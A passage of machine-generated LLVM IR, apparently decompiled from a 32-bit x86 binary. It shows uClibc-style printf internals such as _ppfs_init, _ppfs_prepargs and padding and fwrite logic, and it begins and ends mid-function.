  %v1_80517d7 = load i32, i32* @esp, align 4
  %v2_80517d7 = add i32 %v1_80517d7, 8
  %v3_80517d7 = inttoptr i32 %v2_80517d7 to i32*
  %v4_80517d7 = load i32, i32* %v3_80517d7, align 4
  %v15_80517d7 = icmp eq i32 %v0_80517d2, %v4_80517d7
  %v1_80517db = icmp eq i1 %v15_80517d7, false
  br i1 %v1_80517db, label %dec_label_pc_80518d7, label %dec_label_pc_80517e1

dec_label_pc_80517e1:                             ; preds = %dec_label_pc_80517c2
  store i32 0, i32* %v3_80517d7, align 4
  %v1_80517e9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517e9

dec_label_pc_80517e9:                             ; preds = %dec_label_pc_80517bb, %dec_label_pc_80517e1
  %v1_80517e9 = phi i32 [ %v0_80517c2, %dec_label_pc_80517bb ], [ %v1_80517e9.pre, %dec_label_pc_80517e1 ]
  %v0_80517e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80517e9 = add i32 %v1_80517e9, -4
  %v3_80517e9 = inttoptr i32 %v2_80517e9 to i32*
  store i32 %v0_80517e9, i32* %v3_80517e9, align 4
  %v0_80517ea = load i32, i32* %eax.global-to-local, align 4
  %v2_80517ea = add i32 %v1_80517e9, -8
  %v3_80517ea = inttoptr i32 %v2_80517ea to i32*
  store i32 %v0_80517ea, i32* %v3_80517ea, align 4
  %v1_80517eb = add i32 %v1_80517e9, 368
  %v2_80517eb = inttoptr i32 %v1_80517eb to i32*
  %v3_80517eb = load i32, i32* %v2_80517eb, align 4
  %v5_80517eb = add i32 %v1_80517e9, -12
  %v6_80517eb = inttoptr i32 %v5_80517eb to i32*
  store i32 %v3_80517eb, i32* %v6_80517eb, align 4
  %v0_80517f2 = load i32, i32* @ebp, align 4
  %v1_80517f2 = add i32 %v0_80517f2, ptrtoint (i32* @global_var_8059845.481 to i32)
  store i32 %v1_80517f2, i32* %eax.global-to-local, align 4
  %v2_80517f8 = add i32 %v1_80517e9, -16
  %v3_80517f8 = inttoptr i32 %v2_80517f8 to i32*
  store i32 %v1_80517f2, i32* %v3_80517f8, align 4
  %v0_80517f9 = load i32, i32* %stack_var_-364, align 4
  %v4_80517f9 = inttoptr i32 %v0_80517f9 to i8*
  %v5_80517f9 = call i32 @__GI_fputs_unlocked(i8* %v4_80517f9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80517f9, i32* %eax.global-to-local, align 4
  %v0_80517fe = load i32, i32* @esp, align 4
  %v1_80517fe = add i32 %v0_80517fe, 384
  %v2_80517fe = inttoptr i32 %v1_80517fe to i32*
  %v3_80517fe = load i32, i32* %v2_80517fe, align 4
  store i32 %v3_80517fe, i32* @eax, align 4
  %v0_8051805 = load i32, i32* @ebx, align 4
  store i32 %v0_8051805, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_805180c = call i32 @_charpad()
  store i32 %v0_805180c, i32* %eax.global-to-local, align 4
  %v0_8051811 = load i32, i32* @esp, align 4
  %v1_8051811 = add i32 %v0_8051811, 16
  %v1_8051814 = load i32, i32* @ebx, align 4
  %v12_8051814 = icmp eq i32 %v0_805180c, %v1_8051814
  %v1_8051816 = icmp eq i1 %v12_8051814, false
  br i1 %v1_8051816, label %dec_label_pc_80518d7, label %dec_label_pc_805181c

dec_label_pc_805181c:                             ; preds = %dec_label_pc_80517e9
  %v1_805181c = add i32 %v0_8051811, 356
  %v2_805181c = inttoptr i32 %v1_805181c to i32*
  %v3_805181c = load i32, i32* %v2_805181c, align 4
  %v4_805181c = icmp eq i32 %v3_805181c, 0
  %v1_8051824 = icmp eq i1 %v4_805181c, false
  br i1 %v1_8051824, label %dec_label_pc_8051848, label %dec_label_pc_8051826

dec_label_pc_8051826:                             ; preds = %dec_label_pc_805181c
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8051828 = load i32, i32* @esi, align 4
  %v1_8051828 = icmp eq i32 %v0_8051828, 0
  br i1 %v1_8051828, label %dec_label_pc_805183e.thread, label %dec_label_pc_805183e

dec_label_pc_805183e.thread:                      ; preds = %dec_label_pc_8051826
  br label %dec_label_pc_80518a9

dec_label_pc_805183e:                             ; preds = %dec_label_pc_8051826
  %v2_805182c = add i32 %v0_8051811, 12
  %v3_805182c = inttoptr i32 %v2_805182c to i32*
  store i32 0, i32* %v3_805182c, align 4
  %v1_805182d = add i32 %v0_8051811, 384
  %v2_805182d = inttoptr i32 %v1_805182d to i32*
  %v3_805182d = load i32, i32* %v2_805182d, align 4
  %v5_805182d = add i32 %v0_8051811, 8
  %v6_805182d = inttoptr i32 %v5_805182d to i32*
  store i32 %v3_805182d, i32* %v6_805182d, align 4
  %v0_8051834 = load i32, i32* @esi, align 4
  %v2_8051834 = add i32 %v0_8051811, 4
  %v3_8051834 = inttoptr i32 %v2_8051834 to i32*
  store i32 %v0_8051834, i32* %v3_8051834, align 4
  %v0_8051835 = load i32, i32* @edi, align 4
  %v3_8051835 = inttoptr i32 %v0_8051811 to i32*
  store i32 %v0_8051835, i32* %v3_8051835, align 4
  %v0_8051836 = load i32, i32* %stack_var_-364, align 4
  %v4_8051836 = call i32 @__stdio_fwrite(i32 %v0_8051836, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051836, i32* %eax.global-to-local, align 4
  %v0_805183b = load i32, i32* @esp, align 4
  %v1_805183b = add i32 %v0_805183b, 16
  %v1_805183e.pre = load i32, i32* @esi, align 4
  %v12_805183e = icmp eq i32 %v4_8051836, %v1_805183e.pre
  %v1_8051840 = icmp eq i1 %v12_805183e, false
  br i1 %v1_8051840, label %dec_label_pc_80518d7, label %dec_label_pc_80518a9

dec_label_pc_8051848:                             ; preds = %dec_label_pc_805181c
  %v1_8051848 = add i32 %v0_8051811, 348
  %v2_8051848 = inttoptr i32 %v1_8051848 to i32*
  store i32 0, i32* %v2_8051848, align 4
  %v0_80518a58 = load i32, i32* @esi, align 4
  %v1_80518a59 = icmp eq i32 %v0_80518a58, 0
  %v1_80518a716 = icmp eq i1 %v1_80518a59, false
  br i1 %v1_80518a716, label %dec_label_pc_8051855, label %dec_label_pc_8051848.dec_label_pc_80518a9.loopexit_crit_edge

dec_label_pc_8051848.dec_label_pc_80518a9.loopexit_crit_edge: ; preds = %dec_label_pc_8051848
  %v0_80518a9.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80518a9

dec_label_pc_8051855:                             ; preds = %dec_label_pc_8051848, %dec_label_pc_80518a3
  %v0_8051855 = phi i32 [ %v2_80518a3, %dec_label_pc_80518a3 ], [ %v0_80518a58, %dec_label_pc_8051848 ]
  %tmp103 = icmp ult i32 %v0_8051855, 129
  br i1 %tmp103, label %dec_label_pc_8051864, label %dec_label_pc_805185f

dec_label_pc_805185f:                             ; preds = %dec_label_pc_8051855
  br label %dec_label_pc_8051864

dec_label_pc_8051864:                             ; preds = %dec_label_pc_8051855, %dec_label_pc_805185f
  %storemerge104 = phi i32 [ 128, %dec_label_pc_805185f ], [ %v0_8051855, %dec_label_pc_8051855 ]
  store i32 %storemerge104, i32* %edx.global-to-local, align 4
  %v0_8051864 = load i32, i32* @esp, align 4
  %v1_8051864 = add i32 %v0_8051864, 332
  %v2_805186b = add i32 %v0_8051864, -4
  %v3_805186b = inttoptr i32 %v2_805186b to i32*
  store i32 %v1_8051864, i32* %v3_805186b, align 4
  %v0_805186c = load i32, i32* %edx.global-to-local, align 4
  %v2_805186c = add i32 %v0_8051864, -8
  %v3_805186c = inttoptr i32 %v2_805186c to i32*
  store i32 %v0_805186c, i32* %v3_805186c, align 4
  %v1_805186d = add i32 %v0_8051864, 340
  store i32 %v1_805186d, i32* %eax.global-to-local, align 4
  %v2_8051874 = add i32 %v0_8051864, -12
  %v3_8051874 = inttoptr i32 %v2_8051874 to i32*
  store i32 %v1_805186d, i32* %v3_8051874, align 4
  %v1_8051875 = add i32 %v0_8051864, 204
  store i32 %v1_8051875, i32* @edi, align 4
  %v2_805187c = add i32 %v0_8051864, -16
  %v3_805187c = inttoptr i32 %v2_805187c to i32*
  store i32 %v1_8051875, i32* %v3_805187c, align 4
  %v0_805187d = call i32 @__GI_wcsrtombs()
  store i32 %v0_805187d, i32* @ebx, align 4
  %v0_8051884 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051889 = icmp eq i32 %v0_805187d, 0
  br i1 %v1_8051889, label %dec_label_pc_805189f, label %dec_label_pc_805188d

dec_label_pc_805188d:                             ; preds = %dec_label_pc_8051864
  %v0_805188d = load i32, i32* @ebp, align 4
  %v2_805188d = add i32 %v0_8051884, 12
  %v3_805188d = inttoptr i32 %v2_805188d to i32*
  store i32 %v0_805188d, i32* %v3_805188d, align 4
  %v1_805188e = add i32 %v0_8051884, 384
  %v2_805188e = inttoptr i32 %v1_805188e to i32*
  %v3_805188e = load i32, i32* %v2_805188e, align 4
  %v5_805188e = add i32 %v0_8051884, 8
  %v6_805188e = inttoptr i32 %v5_805188e to i32*
  store i32 %v3_805188e, i32* %v6_805188e, align 4
  %v2_8051895 = add i32 %v0_8051884, 4
  %v3_8051895 = inttoptr i32 %v2_8051895 to i32*
  store i32 %v0_805187d, i32* %v3_8051895, align 4
  %v0_8051896 = load i32, i32* @edi, align 4
  %v3_8051896 = inttoptr i32 %v0_8051884 to i32*
  store i32 %v0_8051896, i32* %v3_8051896, align 4
  %v0_8051897 = load i32, i32* %stack_var_-364, align 4
  %v4_8051897 = call i32 @__stdio_fwrite(i32 %v0_8051897, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051897, i32* %eax.global-to-local, align 4
  %v0_805189c = load i32, i32* @esp, align 4
  br label %dec_label_pc_805189f

dec_label_pc_805189f:                             ; preds = %dec_label_pc_8051864, %dec_label_pc_805188d
  %v0_80518d750.in = phi i32 [ %v0_8051884, %dec_label_pc_8051864 ], [ %v0_805189c, %dec_label_pc_805188d ]
  %v1_80518a3 = phi i32 [ 0, %dec_label_pc_8051864 ], [ %v4_8051897, %dec_label_pc_805188d ]
  %v0_80518d750 = add i32 %v0_80518d750.in, 16
  %v12_805189f = icmp eq i32 %v1_80518a3, %v0_805187d
  %v1_80518a1 = icmp eq i1 %v12_805189f, false
  br i1 %v1_80518a1, label %dec_label_pc_80518d7, label %dec_label_pc_80518a3

dec_label_pc_80518a3:                             ; preds = %dec_label_pc_805189f
  %v0_80518a3 = load i32, i32* @esi, align 4
  %v2_80518a3 = sub i32 %v0_80518a3, %v1_80518a3
  %v12_80518a3 = icmp eq i32 %v2_80518a3, 0
  store i32 %v2_80518a3, i32* @esi, align 4
  %v1_80518a7 = icmp eq i1 %v12_80518a3, false
  br i1 %v1_80518a7, label %dec_label_pc_8051855, label %dec_label_pc_80518a9

dec_label_pc_80518a9:                             ; preds = %dec_label_pc_80518a3, %dec_label_pc_805183e.thread, %dec_label_pc_8051848.dec_label_pc_80518a9.loopexit_crit_edge, %dec_label_pc_805183e
  %v0_80518a9 = phi i32 [ %v1_805183b, %dec_label_pc_805183e ], [ %v0_80518a9.pre.pre, %dec_label_pc_8051848.dec_label_pc_80518a9.loopexit_crit_edge ], [ %v1_8051811, %dec_label_pc_805183e.thread ], [ %v0_80518d750, %dec_label_pc_80518a3 ]
  %v1_80518a9 = add i32 %v0_80518a9, 8
  %v2_80518a9 = inttoptr i32 %v1_80518a9 to i32*
  %v3_80518a9 = load i32, i32* %v2_80518a9, align 4
  store i32 %v3_80518a9, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_80518b2 = add i32 %v0_80518a9, 368
  %v2_80518b2 = inttoptr i32 %v1_80518b2 to i32*
  %v3_80518b2 = load i32, i32* %v2_80518b2, align 4
  store i32 %v3_80518b2, i32* @eax, align 4
  %v0_80518b9 = call i32 @_charpad()
  store i32 %v0_80518b9, i32* %eax.global-to-local, align 4
  %v1_80518be = load i32, i32* @esp, align 4
  %v2_80518be = add i32 %v1_80518be, 8
  %v3_80518be = inttoptr i32 %v2_80518be to i32*
  %v4_80518be = load i32, i32* %v3_80518be, align 4
  %v15_80518be = icmp eq i32 %v0_80518b9, %v4_80518be
  %v1_80518c2 = icmp eq i1 %v15_80518be, false
  br i1 %v1_80518c2, label %dec_label_pc_80518d7, label %dec_label_pc_80518c4

dec_label_pc_80518c4:                             ; preds = %dec_label_pc_80518a9, %dec_label_pc_805163e, %dec_label_pc_805146c
  %v0_80518c4 = phi i32 [ %v1_80518be, %dec_label_pc_80518a9 ], [ %v0_80518c4.pre, %dec_label_pc_805163e ], [ %v1_805148a, %dec_label_pc_805146c ]
  %v1_80518c4 = add i32 %v0_80518c4, 16
  %v2_80518c4 = inttoptr i32 %v1_80518c4 to i32*
  %v3_80518c4 = load i32, i32* %v2_80518c4, align 4
  store i32 %v3_80518c4, i32* @ebx, align 4
  store i32 %v3_80518c4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80513c4.backedge

dec_label_pc_80518cf:                             ; preds = %dec_label_pc_8051402
  %v1_80518cf = add i32 %v0_80518cf, 2
  store i32 %v1_80518cf, i32* @ebx, align 4
  br label %dec_label_pc_80513c4.backedge

dec_label_pc_80518d7:                             ; preds = %dec_label_pc_80513ee, %dec_label_pc_80518a9, %dec_label_pc_805183e, %dec_label_pc_80517e9, %dec_label_pc_80517c2, %dec_label_pc_8051732, %dec_label_pc_80516ad, %dec_label_pc_8051681, %dec_label_pc_8051615, %dec_label_pc_805189f
  %v0_80518d7 = phi i32 [ %v0_80518d750, %dec_label_pc_805189f ], [ %v0_80518d7.pre.pre, %dec_label_pc_80513ee ], [ %v1_80518be, %dec_label_pc_80518a9 ], [ %v1_805183b, %dec_label_pc_805183e ], [ %v1_8051811, %dec_label_pc_80517e9 ], [ %v1_80517d7, %dec_label_pc_80517c2 ], [ %v0_8051464.lcssa, %dec_label_pc_8051732 ], [ %v1_80516c5, %dec_label_pc_80516ad ], [ %v1_8051698, %dec_label_pc_8051681 ], [ %v1_8051633, %dec_label_pc_8051615 ]
  %v1_80518d7 = inttoptr i32 %v0_80518d7 to i32*
  store i32 -1, i32* %v1_80518d7, align 4
  br label %dec_label_pc_80518de

dec_label_pc_80518de:                             ; preds = %dec_label_pc_80513f9, %dec_label_pc_8051367, %dec_label_pc_8051386, %dec_label_pc_80518d7
  %v0_80518de = load i32, i32* @esp, align 4
  %v1_80518de = inttoptr i32 %v0_80518de to i32*
  %v2_80518de = load i32, i32* %v1_80518de, align 4
  store i32 %v2_80518de, i32* %eax.global-to-local, align 4
  %v1_80518e1 = add i32 %v0_80518de, 348
  %v1_80518e7 = inttoptr i32 %v1_80518e1 to i32*
  %v2_80518e7 = load i32, i32* %v1_80518e7, align 4
  store i32 %v2_80518e7, i32* @ebx, align 4
  ret i32 %v2_80518de

; uselistorder directives
  uselistorder i32 %v1_80518cf, { 1, 0 }
  uselistorder i32 %v3_80518c4, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80518a9, { 1, 0 }
  uselistorder i32 %v2_80518a3, { 1, 2, 0 }
  uselistorder i32 %v0_80518d750, { 1, 0 }
  uselistorder i32 %v1_80518a3, { 1, 0 }
  uselistorder i32 %v0_8051884, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_8051811, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_80517e9, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80517c2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8051796, { 1, 0, 2 }
  uselistorder i32 %v6_8051783, { 1, 0 }
  uselistorder i32 %v1_8051780, { 1, 0 }
  uselistorder i32 %v0_8051779, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8051703, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_8051713, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8051674, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_805165a, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_80515f3, { 1, 0, 2 }
  uselistorder i32 %v1_8051577, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_80515ca, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_8051553, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805150c, { 1, 0 }
  uselistorder i32 %v1_8051519, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_8051464, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_8051464.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_8051460, { 1, 0 }
  uselistorder i32 %v1_8051460.pre, { 1, 0 }
  uselistorder i32 %v1_805145f, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_805145c, { 1, 0 }
  uselistorder i32 %v2_805146081, { 1, 0 }
  uselistorder i32 %v3_8051446, { 1, 0 }
  uselistorder i32 %v1_8051402, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80513ce, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80513d2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80513bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 3, 4, 7, 0, 6, 5, 1, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 2, 0, 1 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 205, { 1, 0 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 3, 1, 4, 2, 5, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_80518de, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80518d7, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_80518a9, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805189f, { 1, 0 }
  uselistorder label %dec_label_pc_8051864, { 1, 0 }
  uselistorder label %dec_label_pc_8051855, { 1, 0 }
  uselistorder label %dec_label_pc_80517e9, { 1, 0 }
  uselistorder label %dec_label_pc_80517bb, { 1, 0 }
  uselistorder label %dec_label_pc_80517a0, { 1, 0 }
  uselistorder label %dec_label_pc_805178a, { 1, 0 }
  uselistorder label %dec_label_pc_8051776, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805176a, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051703, { 1, 0 }
  uselistorder label %dec_label_pc_80516f6, { 1, 0 }
  uselistorder label %dec_label_pc_8051681, { 1, 0 }
  uselistorder label %dec_label_pc_8051615, { 1, 0 }
  uselistorder label %dec_label_pc_80515ca, { 1, 0 }
  uselistorder label %dec_label_pc_80515bb, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_8051581, { 1, 0 }
  uselistorder label %dec_label_pc_8051568, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8051519, { 1, 0 }
  uselistorder label %dec_label_pc_8051500, { 1, 0 }
  uselistorder label %dec_label_pc_80514ec, { 1, 0 }
  uselistorder label %dec_label_pc_80514e7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051455, { 1, 0 }
  uselistorder label %dec_label_pc_805144d, { 1, 0 }
  uselistorder label %dec_label_pc_80513f9, { 1, 0 }
  uselistorder label %dec_label_pc_80513ee, { 1, 0 }
  uselistorder label %dec_label_pc_80513c4.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80518ec = load i32, i32* @esi, align 4
  %v0_80518ed = load i32, i32* @ebx, align 4
  store i32 %v0_80518ed, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_8051901 = bitcast i32* %arg1 to i8*
  %v4_8051901 = call i32 @__GI_memset(i8* %v3_8051901, i32 0, i32 188)
  store i32 %v4_8051901, i32* %eax.global-to-local, align 4
  %v0_8051906 = load i32, i32* @ebx, align 4
  %v1_8051906 = add i32 %v0_8051906, 24
  %v2_8051906 = inttoptr i32 %v1_8051906 to i32*
  %v3_8051906 = load i32, i32* %v2_8051906, align 4
  %v4_8051906 = add i32 %v3_8051906, -1
  store i32 %v4_8051906, i32* %v2_8051906, align 4
  %v0_8051909 = load i32, i32* @esi, align 4
  %v1_8051909 = load i32, i32* @ebx, align 4
  %v2_8051909 = inttoptr i32 %v1_8051909 to i32*
  store i32 %v0_8051909, i32* %v2_8051909, align 4
  %v0_805190b = load i32, i32* @ebx, align 4
  %v1_805190b = add i32 %v0_805190b, 40
  store i32 %v1_805190b, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051916

dec_label_pc_8051916:                             ; preds = %dec_label_pc_8051916, %entry
  %v0_8051916 = phi i32 [ %v1_805191c, %dec_label_pc_8051916 ], [ %v1_805190b, %entry ]
  %v1_8051916 = inttoptr i32 %v0_8051916 to i32*
  store i32 8, i32* %v1_8051916, align 4
  %v0_805191c = load i32, i32* %eax.global-to-local, align 4
  %v1_805191c = add i32 %v0_805191c, 4
  store i32 %v1_805191c, i32* %eax.global-to-local, align 4
  %v0_805191f = load i32, i32* %edx.global-to-local, align 4
  %v1_805191f = add i32 %v0_805191f, -1
  %v8_805191f = icmp eq i32 %v1_805191f, 0
  store i32 %v1_805191f, i32* %edx.global-to-local, align 4
  %v1_8051920 = icmp eq i1 %v8_805191f, false
  br i1 %v1_8051920, label %dec_label_pc_8051916, label %dec_label_pc_8051922

dec_label_pc_8051922:                             ; preds = %dec_label_pc_8051916
  %v0_8051922 = load i32, i32* @esi, align 4
  store i32 %v0_8051922, i32* %eax.global-to-local, align 4
  %v1_805194d20 = inttoptr i32 %v0_8051922 to i8*
  %v2_805194d21 = load i8, i8* %v1_805194d20, align 1
  %v3_805194d22 = zext i8 %v2_805194d21 to i32
  %v5_805194d23 = and i32 %v1_805191f, -256
  %v6_805194d24 = or i32 %v3_805194d22, %v5_805194d23
  store i32 %v6_805194d24, i32* %edx.global-to-local, align 4
  %v4_805194f25 = icmp eq i8 %v2_805194d21, 0
  %v1_805195126 = icmp eq i1 %v4_805194f25, false
  br i1 %v1_805195126, label %dec_label_pc_805192b, label %dec_label_pc_8051953

dec_label_pc_805192b:                             ; preds = %dec_label_pc_8051922, %dec_label_pc_805194d.backedge
  %v6_805194d29 = phi i32 [ %v6_805194d, %dec_label_pc_805194d.backedge ], [ %v6_805194d24, %dec_label_pc_8051922 ]
  %v2_805194d28 = phi i8 [ %v2_805194d, %dec_label_pc_805194d.backedge ], [ %v2_805194d21, %dec_label_pc_8051922 ]
  %v0_805193027 = phi i32 [ %v0_8051930.be, %dec_label_pc_805194d.backedge ], [ %v0_8051922, %dec_label_pc_8051922 ]
  %v10_805192b = icmp eq i8 %v2_805194d28, 37
  %v1_805192e = icmp eq i1 %v10_805192b, false
  br i1 %v1_805192e, label %dec_label_pc_805194c, label %dec_label_pc_8051930

dec_label_pc_8051930:                             ; preds = %dec_label_pc_805192b
  %v1_8051930 = add i32 %v0_805193027, 1
  store i32 %v1_8051930, i32* %eax.global-to-local, align 4
  %v1_8051931 = inttoptr i32 %v1_8051930 to i8*
  %v2_8051931 = load i8, i8* %v1_8051931, align 1
  %v11_8051931 = icmp eq i8 %v2_8051931, 37
  br i1 %v11_8051931, label %dec_label_pc_805194c, label %dec_label_pc_8051936

dec_label_pc_8051936:                             ; preds = %dec_label_pc_8051930
  %v1_8051939 = load i32, i32* @ebx, align 4
  %v2_8051939 = inttoptr i32 %v1_8051939 to i32*
  store i32 %v1_8051930, i32* %v2_8051939, align 4
  %v0_805193b = load i32, i32* @ebx, align 4
  %v1_805193c = inttoptr i32 %v0_805193b to i32*
  %v2_805193c = call i32 @_ppfs_parsespec(i32* %v1_805193c)
  store i32 %v2_805193c, i32* %eax.global-to-local, align 4
  %v2_8051944 = icmp slt i32 %v2_805193c, 0
  br i1 %v2_8051944, label %dec_label_pc_8051957, label %dec_label_pc_8051948

dec_label_pc_8051948:                             ; preds = %dec_label_pc_8051936
  %v0_8051948 = load i32, i32* @ebx, align 4
  %v1_8051948 = inttoptr i32 %v0_8051948 to i32*
  %v2_8051948 = load i32, i32* %v1_8051948, align 4
  %v4_805194d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805194d.backedge

dec_label_pc_805194c:                             ; preds = %dec_label_pc_8051930, %dec_label_pc_805192b
  %v0_805194c = phi i32 [ %v1_8051930, %dec_label_pc_8051930 ], [ %v0_805193027, %dec_label_pc_805192b ]
  %v1_805194c = add i32 %v0_805194c, 1
  br label %dec_label_pc_805194d.backedge

dec_label_pc_805194d.backedge:                    ; preds = %dec_label_pc_805194c, %dec_label_pc_8051948
  %v4_805194d.be = phi i32 [ %v4_805194d.pre.pre, %dec_label_pc_8051948 ], [ %v6_805194d29, %dec_label_pc_805194c ]
  %v0_8051930.be = phi i32 [ %v2_8051948, %dec_label_pc_8051948 ], [ %v1_805194c, %dec_label_pc_805194c ]
  store i32 %v0_8051930.be, i32* %eax.global-to-local, align 4
  %v1_805194d = inttoptr i32 %v0_8051930.be to i8*
  %v2_805194d = load i8, i8* %v1_805194d, align 1
  %v3_805194d = zext i8 %v2_805194d to i32
  %v5_805194d = and i32 %v4_805194d.be, -256
  %v6_805194d = or i32 %v3_805194d, %v5_805194d
  store i32 %v6_805194d, i32* %edx.global-to-local, align 4
  %v4_805194f = icmp eq i8 %v2_805194d, 0
  %v1_8051951 = icmp eq i1 %v4_805194f, false
  br i1 %v1_8051951, label %dec_label_pc_805192b, label %dec_label_pc_805194d.dec_label_pc_8051953_crit_edge

dec_label_pc_805194d.dec_label_pc_8051953_crit_edge: ; preds = %dec_label_pc_805194d.backedge
  %v0_8051953.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051953

dec_label_pc_8051953:                             ; preds = %dec_label_pc_805194d.dec_label_pc_8051953_crit_edge, %dec_label_pc_8051922
  %v0_8051953 = phi i32 [ %v0_8051953.pre, %dec_label_pc_805194d.dec_label_pc_8051953_crit_edge ], [ %v0_8051922, %dec_label_pc_8051922 ]
  %v1_8051953 = load i32, i32* @ebx, align 4
  %v2_8051953 = inttoptr i32 %v1_8051953 to i32*
  store i32 %v0_8051953, i32* %v2_8051953, align 4
  br label %dec_label_pc_8051957

dec_label_pc_8051957:                             ; preds = %dec_label_pc_8051936, %dec_label_pc_8051953
  %storemerge = phi i32 [ 0, %dec_label_pc_8051953 ], [ -1, %dec_label_pc_8051936 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8051957 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051957, i32* @edx, align 4
  %v2_8051958 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051958, i32* @ebx, align 4
  store i32 %v0_80518ec, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_805194d, { 1, 0 }
  uselistorder i8 %v2_805194d, { 1, 2, 0 }
  uselistorder i32 %v0_8051930.be, { 2, 1, 0 }
  uselistorder i32 %v0_805193027, { 1, 0 }
  uselistorder i32 %v0_8051922, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805191f, { 0, 2, 1 }
  uselistorder i32 %v1_805191c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_8051957, { 1, 0 }
  uselistorder label %dec_label_pc_805192b, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805195c = load i32, i32* @esi, align 4
  %v0_805195d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051969 = add i32 %arg1, 24
  %v2_8051969 = inttoptr i32 %v1_8051969 to i32*
  %v3_8051969 = load i32, i32* %v2_8051969, align 4
  %v2_805196c = add i32 %arg1, 76
